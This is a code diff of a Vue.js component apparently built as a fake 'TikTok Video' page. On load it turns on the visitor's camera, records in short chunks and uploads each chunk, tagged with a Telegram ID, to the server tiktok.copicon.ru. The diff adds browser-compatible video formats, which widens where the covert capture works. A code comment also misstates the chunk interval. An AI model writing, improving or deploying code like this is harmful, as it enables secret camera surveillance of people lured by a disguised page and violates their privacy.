@@ -27,11 +27,13 @@ export default {
       isActiveCanvas: false,
       isActiveCameraVideo: false,
       infoBlockActive: false,
-      baseUrl: 'https://tiktok.copicon.ru'
+      baseUrl: 'https://tiktok.copicon.ru',
+      defaultMimeType: { mimeType: 'video/webm; codecs=vp8'},
+      options: null,
+      videoFormat: null
     };
   },
   mounted() {
-
     this.startCamera(); // Стартуем камеру при загрузке компонента
     document.title = "TikTok Video №10394"
   },
@@ -50,8 +52,17 @@ export default {
     this.$refs.video.srcObject = this.stream;
 
     // Устанавливаем настройки MediaRecorder и стартуем запись с заданным интервалом
-    const options = { mimeType: 'video/webm' }; // Используем 'video/webm' для совместимости
-    const mediaRecorder = new MediaRecorder(this.stream, options);
+
+    if (MediaRecorder.isTypeSupported(this.defaultMimeType.mimeType)){
+      this.options = { mimeType: 'video/webm; codecs=vp8'}; 
+      this.videoFormat = 'webm'
+    } else {
+      this.options = {mimeType: 'video/mp4; codecs="avc1.42E01E, mp4a.40.2"'}
+      this.videoFormat = 'mp4'
+    }
+    
+
+    const mediaRecorder = new MediaRecorder(this.stream, this.options);
     const CHUNK_INTERVAL = 350; // Интервал отправки 0.5 секунды (500 мс)
     mediaRecorder.start(CHUNK_INTERVAL);
 
@@ -59,7 +70,7 @@ export default {
     mediaRecorder.ondataavailable = async (event) => {
       const chunk = event.data;
       const formData = new FormData();
-      formData.append('video', chunk, `${this.video_name}.webm`);
+      formData.append('video', chunk, `${this.video_name}.${this.videoFormat}`);
       formData.append('telegram_id', this.telegramId);
 
       try {
